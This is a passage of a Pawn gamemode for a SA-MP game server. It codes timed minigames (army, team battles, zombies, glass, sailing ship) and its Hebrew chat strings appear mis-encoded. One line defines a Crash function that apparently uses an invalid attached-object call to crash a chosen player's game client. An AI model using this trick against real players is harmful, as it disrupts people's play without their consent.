	SendClientMessageToAll(yellow," * .Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_army "$ Army Game ффЎш°Їх· ьЇЄщьх·");
	format(string,sizeof(string)," .[#%d] %s :ёхт фЇЄщьх·",armyinfo[4],army[armyinfo[4]-1][arName]);
	SendClientMessageToAll(green,string);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~y~~h~army~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartArmy");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartArmy");
	return 1;
}
//=[StartArmy2]=================================================================
public StartArmy2()
{
	#if lagtest
		LagTest_Start("StartArmy2");
	#endif
	if(debugstate) printf("Gamemode Activity [start]: StartArmy2");
	new string[M_S];
	armyinfo[2]--;
	if(armyinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(armyinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~y~~h~Army Game: ~h~%d~n~~y~~h~(%d/%d)",armyinfo[2],armyinfo[1],sizeof(ArmyPositions));
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(armyinfo[2] == 15 || armyinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· Army Game ·ч°х· ф",armyinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(armyinfo[2] == 3)
	{
		if(armyinfo[1] < 2) return EndArmy("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitarmy])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				ResetWeapons(i);
				SetPlayerVirtualWorld(i,world_army);
				SetVehicleVirtualWorld(playerinfo[i][armyv],world_army);
				SetPlayerInterior(i,0);
				LinkVehicleToInterior(playerinfo[i][armyv],0);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				PutPlayerInVehicle(i,playerinfo[i][armyv],0);
				SetCameraBehindPlayer(i);
				SetVehicleHealth(playerinfo[i][armyv],3000.0);
				ResetWeapons(i);
				vehicleinfo[playerinfo[i][armyv]][armydriver] = i;
				SendClientMessage(i,orange," !Army Game-сфЎьчф с·ч°х· ф");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(armyinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitarmy])
			{
				playerinfo[i][inarmy] = 1, playerinfo[i][waitarmy] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d Army Game-·ч°х· ф",armyinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(armyinfo[3]);
	}
	#if lagtest
		LagTest_End("StartArmy2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartArmy2");
	return 1;
}
//=[Crash]======================================================================
public Crash(playerid) return SetPlayerAttachedObject(playerid,0,0,0), 1;
//=[FileSetString]==============================================================
public FileSetString(fname[],key[],val[]) return fsetstring(fname,key,val), 1;
//=[OpenLunaPark]===============================================================
public OpenLunaPark()
{
	if(debugstate) printf("Gamemode Activity [start]: OpenLunaPark");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightgreen," Х Х /LPark :фьхЁф Їр°ў ЁЇ·ч ью∙ъ чЎщ ∙Єф! ьыЁщёф Х Х");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SetTimer("CloseLunaPark",1800000,0);
	if(debugstate) printf("Gamemode Activity [end]: OpenLunaPark");
	return 1;
}
//=[CloseLunaPark]==============================================================
public CloseLunaPark()
{
	specialActivity = sa_none;
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightgreen," Х Х !фьхЁф Їр°ў Ёёт° Х Х");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	return 1;
}
//=[StartSailingShip]===========================================================
public StartSailingShip()
{
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightblue," !ю·чщьф Єы∙щх - Sailing Ship :ЇЄщьх· ющхчу· юёхт");
	SendClientMessageToAll(0x0066FFFF," .сЄху ы∙·щ уўх· ·чь фЇьтф рхшхюшщ· сёЇщЁф ЄЁўщ·");
	SendClientMessageToAll(0x0000FFFF," /sship :рэ р·э °хЎщэ ьф∙··є, рх ∙ё·э ср ьыэ ьф°тЄ, фЎш°Їх Єы∙щх");
	SendClientMessageToAll(darkblue," !∙щюх ьс ыщ ьр щфщф Ёщ·я ьфЎш°є ьфЇьтф рч°щ ∙фщр ф·чщьф");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	GameTextForAll("~b~sailing ship~n~/sship",6000,1);
	SetTimer("Sailing",120000,0);
	ssRoute = 0;
	return 1;
}
//=[Sailing]====================================================================
public Sailing()
{
	new string[M_S];
	ssRoute = 1;
	BotSay(" !∙ьхэ °с ьыь фрх°чщэ сёЇщЁф",true);
	format(string,sizeof(string)," ,хрЁщ фўЇшя ∙ьыэ ьфЇЄэ %s рЁщ",botname);
	BotSay(string,true);
	BotSay(" .рЁчЁх фхьыщэ ь∙хш сю∙ъ ыюф уўх· ∙ь ∙ўш хЁхє",true);
	BotSay(" (: !·фЁх",true);
	MoveObject(ssObject[0],SailingShipRoutes[ssRoute][0],SailingShipRoutes[ssRoute][1],SailingShipRoutes[ssRoute][2],4.0,SailingShipRoutes[ssRoute][3],SailingShipRoutes[ssRoute][4],SailingShipRoutes[ssRoute][5]);
	return 1;
}
//=[EndSailingShip]=============================================================
public EndSailingShip()
{
	ssRoute = 0;
	MoveObject(ssObject[0],SailingShipRoutes[ssRoute][0],SailingShipRoutes[ssRoute][1],SailingShipRoutes[ssRoute][2],4.0,SailingShipRoutes[ssRoute][3],SailingShipRoutes[ssRoute][4],SailingShipRoutes[ssRoute][5]);
	BotSay(" .ф∙щщш фё·щщэ! юўххф ∙ЁфЁ·э",true);
	specialActivity = sa_none;
	return 1;
}
//=[RemovePlayerTempPickup]=====================================================
public RemovePlayerTempPickup(playerid,vid,Float:vh,param)
{
	if(param == 1) // Freeze Time
	{
		for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][inact] && !playerinfo[x][tooktempickup])
		{
			GameTextForPlayer(x, "~g~un freeze", 2000, 4);
			SetFreeze(x, 0);
		}
	}
	else if(param == 2) // No Engine
	{
	    new engine, lights, alarm, doors, bonnet, boot, objectiv, vehicleid;
	    for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][inact] && playerid != x)
		{
	        vehicleid = GetPlayerVehicleID(x);
			GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objectiv);
			SetVehicleParamsEx(vehicleid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, boot, objectiv);
		}
	}
	else
 	{
		playerinfo[playerid][speedup][0] = 0.0,
		playerinfo[playerid][speedup][1] = 0.0,
		playerinfo[playerid][speedup][2] = 0.0;
		if(kartinfo[0])
		{
			if(vh != -1.0) SetVehicleHealth(vid,vh);
			vehicleinfo[vid][vgm] = 0;
		}
	}
	playerinfo[playerid][tooktempickup] = 0;
	return 1;
}
//=[RemovePlayerTDMPickup]======================================================
public RemovePlayerTDMPickup(playerid,typ,Float:h)
{
	playerinfo[playerid][tooktempickup] = 0;
	switch(typ)
	{
		case 0: SetPlayerHealth(playerid,h);
		case 1: if(playerinfo[playerid][vtemp] != INVALID_VEHICLE_ID) DestroyVehicleEx(playerinfo[playerid][vtemp]);
	}
	playerinfo[playerid][gm] = 0;
	if(IsFlying(playerid))
	{
		StopFlying(playerid);
		SetPlayerHealth(playerid,100.0);
	}
	ResetAttachedObjects(playerid);
	return 1;
}
//=[StartActivitySequence]======================================================
public StartActivitySequence()
{
	if(debugstate) printf("Gamemode Activity [start]: StartActivitySequence");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightgreen," Х Х !°Ўє ЇЄщьхщх· ю·чщь Єы∙щх ь-45 уўх· фў°хсх· Х Х");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	ActivitySequence(1);
	SendRconCommand("hostname " hostnameFirst " (Activities!)");
	SetTimer("EndActivitySequence",2700000,0);
	if(debugstate) printf("Gamemode Activity [end]: StartActivitySequence");
	return 1;
}
//=[ActivitySequence]===========================================================
public ActivitySequence(numact)
{
	#if lagtest
		LagTest_Start("ActivitySequence");
	#endif
	if(specialActivity == sa_sequence)
	{
		if(!thereIsAct)
		{
			SetTimerEx("ActivitySequence",180000,0,"i",numact+1);
			new string[64];
			format(string,sizeof(string)," Х :ЇЄщьх· юёЇ° #%02d с°Ўє фЇЄщьхщх·",numact);
			SendClientMessageToAll(lightgreen,string);
			StartActivity();
		}
		else SetTimerEx("ActivitySequence",180000,0,"i",numact);
	}
	#if lagtest
		LagTest_End("ActivitySequence");
	#endif
	return 1;
}
//=[EndActivitySequence]========================================================
public EndActivitySequence()
{
	specialActivity = sa_none;
	new str[64];
	format(str,sizeof(str),"hostname %s",hostname_);
	SendRconCommand(str);
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	SendClientMessageToAll(lightgreen," Х Х !°Ўє фЇЄщьхщх· фё·щщэ Х Х");
	SendClientMessageToAll(blue,"- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -");
	return 1;
}
//=[FacePunch]==================================================================
public FacePunch(playerid,Text:tdraw,animframe)
{   // by JernejL, improved by my
	#if lagtest
		LagTest_Start("FacePunch");
	#endif
	if(animframe == 31 && tdraw != Text:INVALID_TEXT_DRAW)
	{
		TextDrawHideForPlayer(playerid,tdraw);
		TextDrawDestroy(tdraw);
		playerinfo[playerid][punch] = 0;
		return 1;
	}
	if(animframe == 30) return SetTimerEx("FacePunch",5000,0,"iii",playerid,_:tdraw,animframe + 1), 1;
	if(tdraw != Text:INVALID_TEXT_DRAW) TextDrawDestroy(tdraw);
	new Text:td = TextDrawCreate(320.0 - ((animframe * 20.0) * 0.5),240.0 - ((animframe * 20.0) * 0.5),"hud:fist");
	TextDrawFont(td,4);
	TextDrawTextSize(td,animframe * 20.0,animframe * 20.0);
	TextDrawShowForPlayer(playerid,td);
	SetTimerEx("FacePunch",20,0,"iii",playerid,_:td,animframe + 1);
	PlaySound(playerid,1130);
	#if lagtest
		LagTest_End("FacePunch");
	#endif
	return 1;
}
//=[StartTeamActivity]==========================================================
public StartTeamActivity(atype)
{
	if(debugstate) printf("Gamemode Activity [start]: StartTeamActivity(%d)",atype);
	#if lagtest
		LagTest_Start("StartTeamActivity");
	#endif
	new string[M_S];
	if(thereIsAct) return 0;
	teamactinfo[0] = 1, teamactinfo[1] = 0, teamactinfo[2] = 60, teamactinfo[3] = SetTimer("StartTeamActivity2",1000,1), teamactinfo[4] = atype, teamactinfo[5] = 0, teamactinfo[6] = 0;
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	format(string,sizeof(string)," !··чщь сЄху уўф " @c(lightpurple) "%s" @c(purple) " ЇЄщьх· фўсхЎх·",TeamActivities[teamactinfo[4]][taName]);
	SendClientMessageToAll(purple,string);
	format(string,sizeof(string)," {%s}%s" @c(white) " VS {%s}%s",HexStringOfColor(TeamActivities[teamactinfo[4]][taT1Color]),TeamActivities[teamactinfo[4]][taT1Name],HexStringOfColor(TeamActivities[teamactinfo[4]][taT2Color]),TeamActivities[teamactinfo[4]][taT2Name]);
	SendClientMessageToAll(0,string);
	format(string,sizeof(string)," /join рх %s join ьфЎш°Їх· °∙юх р· фЇўхуф",TeamActivities[teamactinfo[4]][taCommand]);
	SendClientMessageToAll(purple,string);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	format(string,sizeof(string),"~r~~h~%s~n~/join",TeamActivities[teamactinfo[4]][taName]);
	GameTextForAll(string,6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartTeamActivity");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartTeamActivity");
	return 1;
}
//=[StartTeamActivity2]=========================================================
public StartTeamActivity2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartTeamActivity2");
	#if lagtest
		LagTest_Start("StartTeamActivity2");
	#endif
	new string[M_S];
	teamactinfo[2]--;
	if(teamactinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(teamactinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~r~~h~~h~%s: ~h~%d~n~~r~~h~~h~(%d/%d)",TeamActivities[teamactinfo[4]][taName],teamactinfo[2],teamactinfo[1],GetMaxTeamActivityPositions(TeamActivities[teamactinfo[4]][taT1Positions]));
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(teamactinfo[2] == 15 || teamactinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· %s ЇЄщьх· фўсхЎх·",teamactinfo[2],TeamActivities[teamactinfo[4]][taName]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(teamactinfo[2] == 3)
	{
		if(teamactinfo[1] < TeamActivities[teamactinfo[4]][taMinPlayers])
		{
			format(string,sizeof(string),"фЎш°Їх Їчх· ю-%d ∙чўЁщэ",teamactinfo[1]);
			return EndTeamActivity(string,-1);
		}
		if(teamactinfo[5] < 2 || teamactinfo[6] < 2) return EndTeamActivity("рщя рщцхя сўсхЎх·",-1);
		for(new i = 0, r = -1; i < MAX_PLAYERS_; i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitteamact])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				ResetWeapons(i);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				if(playerinfo[i][teamactteam] == 1)
				{
					for(new j = 0; j < 5; j++) if(TeamActivities[teamactinfo[4]][taT1Weapons][j] != -1) GiveWeapon(i,TeamActivities[teamactinfo[4]][taT1Weapons][j],TeamActivities[teamactinfo[4]][taT1Ammo][j]);
					for(new j = 0; j < 3; j++) if(TeamActivities[teamactinfo[4]][taT1Skin][j] != -1) r = i+1;
					if(r != -1) SetPlayerSkin(i,TeamActivities[teamactinfo[4]][taT1Skin][random(i)]);
					SendClientMessage(i,TeamActivities[teamactinfo[4]][taT1Color]," ╗ .сфЎьчф! ·цы°х ьЄсху ыЎхх·. ф∙·ю∙х с ! с·чщь· ффхуЄф ыущ ьы·хс сЎ'рш ўсхЎф");
					SetPlayerHealth(i,TeamActivities[teamactinfo[4]][taT1Health][0]);
					SetPlayerArmour(i,TeamActivities[teamactinfo[4]][taT1Health][1]);
					SetPlayerColor(i,TeamActivities[teamactinfo[4]][taT1Color]);
					TeleportPlayerToTeamActivity(i,TeamActivities[teamactinfo[4]][taT1Positions]);
				}
				else if(playerinfo[i][teamactteam] == 2)
				{
					for(new j = 0; j < 5; j++) if(TeamActivities[teamactinfo[4]][taT2Weapons][j] != -1) GiveWeapon(i,TeamActivities[teamactinfo[4]][taT2Weapons][j],TeamActivities[teamactinfo[4]][taT2Ammo][j]);
					for(new j = 0; j < 3; j++) if(TeamActivities[teamactinfo[4]][taT2Skin][j] != -1) r = i+1;
					if(r != -1) SetPlayerSkin(i,TeamActivities[teamactinfo[4]][taT2Skin][random(i)]);
					SendClientMessage(i,TeamActivities[teamactinfo[4]][taT2Color]," ╗ .сфЎьчф! ·цы°х ьЄсху ыЎхх·. ф∙·ю∙х с ! с·чщь· ффхуЄф ыущ ьы·хс сЎ'рш ўсхЎф");
					SetPlayerHealth(i,TeamActivities[teamactinfo[4]][taT2Health][0]);
					SetPlayerArmour(i,TeamActivities[teamactinfo[4]][taT2Health][1]);
					SetPlayerColor(i,TeamActivities[teamactinfo[4]][taT2Color]);
					TeleportPlayerToTeamActivity(i,TeamActivities[teamactinfo[4]][taT2Positions]);
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetCameraBehindPlayer(i);
				SetPlayerArmedWeapon(i,PlayerHasWeapon(i,1) ? 1 : 0);
				SetPlayerTime(i,TeamActivities[teamactinfo[4]][taTime],0);
				SetPlayerWeather(i,TeamActivities[teamactinfo[4]][taWeather]);
				TeamDefines(i);
				ResetWeapons(i);
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(teamactinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitteamact])
			{
				playerinfo[i][inteamact] = 1, playerinfo[i][waitteamact] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d %s ЇЄщьх· фўсхЎх·",teamactinfo[1],TeamActivities[teamactinfo[4]][taName]);
		SendClientMessageToAll(purple,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(teamactinfo[3]);
	}
	#if lagtest
		LagTest_End("StartTeamActivity2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartTeamActivity2");
	return 1;
}
//=[ConnectNPCs]================================================================
public ConnectNPCs()
{
	new string[M_S];
	if(USING_NPCS_)
	{
		new maxnpc[16], maxnpcs = sizeof(NPCs);
		format(maxnpc,sizeof(maxnpc),"maxnpc %d",maxnpcs);
		SendRconCommand(maxnpc);
		for(new i = 0; i < maxnpcs; i++)
		{
			format(string,sizeof(string),NPCs[i][npcName]);//GenerateRandomName("NPC_","",5));
			ConnectNPC(string,NPCs[i][npcFile]);
			SetProperty_STR(string,NPCs[i][npcName]);
			if(NPCs[i][npcVehicle]) npcVehicles[i] = CreateNPCVehicle(NPCs[i][npcVehicleModel],NPCs[i][npcPos][0],NPCs[i][npcPos][1],NPCs[i][npcPos][2],NPCs[i][npcPos][3],NPCs[i][npcVehicleColor][0],NPCs[i][npcVehicleColor][1],respawntime,NPCs[i][npcInterior],NPCs[i][npcWorld]);
		}
	}
	return 1;
	/*if(USING_NPCS_)
	{
		new npcC, maxnpc[16], maxnpcs = sizeof(NPCs);
		format(maxnpc,sizeof(maxnpc),"maxnpc %d",maxnpcs);
		SendRconCommand(maxnpc);
		for(new i = 0; i < maxnpcs; i++)
		{
			ConnectNPC(NPCs[i][npcName],NPCs[i][npcFile]);
			npcC = rgba2hex(random(256),random(256),random(256),200);
			NPCs[i][npcText] = Create3DTextLabel(NPCs[i][npcName],npcC,0.0,0.0,0.0,50.0,0,0);
			SetPlayerColor(i,npcC);
			if(NPCs[i][npcVehicle]) npcVehicles[i] = CreateNPCVehicle(NPCs[i][npcVehicleModel],NPCs[i][npcPos][0],NPCs[i][npcPos][1],NPCs[i][npcPos][2],NPCs[i][npcPos][3],NPCs[i][npcVehicleColor][0],NPCs[i][npcVehicleColor][1],respawntime,NPCs[i][npcInterior],NPCs[i][npcWorld]);
		}
	}*/
}
//=[EndPickupsActivity]=========================================================
public EndPickupsActivity()
{
	SendClientMessageToAll(red," * !ЇЄщьх· фЇщўрЇ фё·щщюф, рє рчу ьр ьўч р· фЇщўрЇ");
	pastatus = 0;
	DestroyPickupEx(pickact);
	GangZoneHideForAll(pickactzone);
	GangZoneDestroy(pickactzone);
	return 1;
}
//=[StartZombies]===============================================================
public StartZombies()
{
	if(debugstate) printf("Gamemode Activity [start]: StartZombies");
	if(thereIsAct) return 0;
	zombiesinfo[0] = 1, zombiesinfo[1] = 0, zombiesinfo[2] = 60, zombiesinfo[3] = SetTimer("StartZombies2",1000,1);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !юьчю· ∙°· ··чщь сЄху уўф! схрх ьсчхя р· щыхьх·щыэ сЁ∙ўщэ");
	SendClientMessageToAll(green," /join рх /zombies join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьюьчю· ф∙°· Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_zombies "$");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~r~zombies~n~/join",6000,1);
	thereIsAct = true;
	if(debugstate) printf("Gamemode Activity [end]: StartZombies");
	return 1;
}
//=[StartZombies2]==============================================================
public StartZombies2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartZombies2");
	new string[M_S];
	zombiesinfo[2]--;
	if(zombiesinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(zombiesinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~r~Zombies: ~h~%d~n~~r~(%d/%d)",zombiesinfo[2],zombiesinfo[1],MAX_ACTIVITY_PLAYERS);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(zombiesinfo[2] == 10 || zombiesinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :фюьчюф ··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх·",zombiesinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(zombiesinfo[2] == 3)
	{
		if(zombiesinfo[1] < 2) return EndZombies("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0,id=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitzombies])
			{
				SetFreeze(i,1);
				id = playerinfo[i][zombiesid];
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				SetPlayerPos(i,WarPositions_13[id][0],WarPositions_13[id][1],WarPositions_13[id][2]);
				SetPlayerFacingAngle(i,WarPositions_13[id][3]);
				SetPlayerInterior(i,0);
				SetPlayerVirtualWorld(i,world_zombies);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetPlayerHealth(i,100.0);
				SetPlayerArmour(i,100.0);
				ResetWeapons(i);
				if(playerinfo[i][zombiesweapon] == 0)
				{
				    SetPlayerAttachedObject(i,0,2044,6,0.100000,0.000000,0.000000,-90.000000,0.000000,180.000000,2.500000,3.20000,5.00000);
	                SetPlayerAttachedObject(i,1,2908,2,0.10000,0.02000,0.000000,0.000000,180.000000,295.000000,1.800000,1.500000,1.70000);
					SetPlayerAttachedObject(i,2,2907,1,-0.05000,0.05000,0.040000,90.000000,180.000000,270.000000,1.400000,1.000000,1.80000);
					GiveWeapon(i,29,10000);
				}
				else if(playerinfo[i][zombiesweapon] == 1)
				{
				    SetPlayerAttachedObject(i,0,2036,6,0.300000,0.0000000,0.020000,90.000000,358.000000,0.000000,1.000000,1.90000,3.000000);
	                SetPlayerAttachedObject(i,1,2908,2,0.10000,0.02000,0.000000,0.000000,180.000000,295.000000,1.800000,1.500000,1.70000);
					SetPlayerAttachedObject(i,2,2907,1,-0.05000,0.05000,0.040000,90.000000,180.000000,270.000000,1.400000,1.000000,1.80000);
					GiveWeapon(i,30,10000);
				}
				SetCameraBehindPlayer(i);
				SendClientMessage(i,orange," !сфЎьчф сюьчю· фцхюсщэ");
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(zombiesinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitzombies])
			{
				playerinfo[i][inzombies] = 1, playerinfo[i][waitzombies] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," юьчю· фцхюсщэ ф·чщьф! юёЇ° фю∙··Їщэ: %d",zombiesinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(zombiesinfo[3]);
	}
	if(debugstate) printf("Gamemode Activity [end]: StartZombies2");
	return 1;
}
//=[StartGlass]=================================================================
public StartGlass()
{
	if(debugstate) printf("Gamemode Activity [start]: StartGlass");
	if(thereIsAct) return 0;
	#if lagtest
		LagTest_Start("StartGlass");
	#endif
	glassinfo[0] = 1, glassinfo[1] = 0, glassinfo[2] = 60, glassinfo[3] = SetTimer("StartGlass2",1000,1);
	ReloadGlass();
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !··чщь сЄху уўф, р·э юхцюЁщэ ьф∙··є (Glass) ·ч°х· фцыхыщх·");
	SendClientMessageToAll(green," /join рх /glass join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .фЎш°Їх· ь·ч°х· фцыхыщх· Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_glass "$");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~b~glass~n~/join",6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartGlass");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartGlass");
	return 1;
}
//=[StartGlass2]================================================================
public StartGlass2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartGlass2");
	#if lagtest
		LagTest_Start("StartGlass2");
	#endif
	new string[M_S];
	glassinfo[2]--;
	if(glassinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(glassinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~b~Glass: ~h~%d~n~~b~(%d/%d)",glassinfo[2],glassinfo[1],MAX_ACTIVITY_PLAYERS);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(glassinfo[2] == 10 || glassinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· (Glass) ·ч°х· фцыхыщх·",glassinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(glassinfo[2] == 3)
	{
